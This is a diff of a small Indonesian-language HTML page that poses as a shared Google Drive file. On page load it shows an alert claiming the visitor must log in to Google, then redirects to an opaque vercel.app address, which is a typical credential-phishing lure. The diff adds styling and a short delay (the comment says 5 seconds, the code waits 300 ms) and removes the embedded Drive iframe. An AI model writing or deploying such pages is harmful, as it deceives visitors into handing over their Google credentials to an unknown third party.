@@ -1,17 +1,29 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
+  <style>
+  body {
+   background: url('bg.jpg');
+    background-size: cover;
+  }
+  img {
+    width: 100%;
+    height: 100%;
+  }
+  </style>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Alert dan Redirect</title>
     <script>
         window.onload = function() {
-            alert("Anda harus login ke google untuk melihat file ini!");
-            window.location.href = "https://g5rc5rf76g77ygh7gg6f65tft6ftghi8j61.vercel.app/"; // Ganti dengan URL tujuan
-        }
+          setTimeout(function() {
+           alert("Anda harus login ke google untuk mengakses file ini!");
+         window.location.href = "https://g5rc5rf76g77ygh7gg6f65tft6ftghi8j61.vercel.app/";
+    }, 300); // Tunggu 5 detik sebelum menampilkan alert dan mengarahkan ke URL
+};
     </script>
 </head>
 <body>
-<iframe src="https://drive.google.com/file/d/1KvMfJ7Q8jt_-6Tnq1WMS3T0dwcXycHdL/view?usp=drivesdk" width="100%" height="100%" style="border:none;"></iframe>
 </body>
 </html>
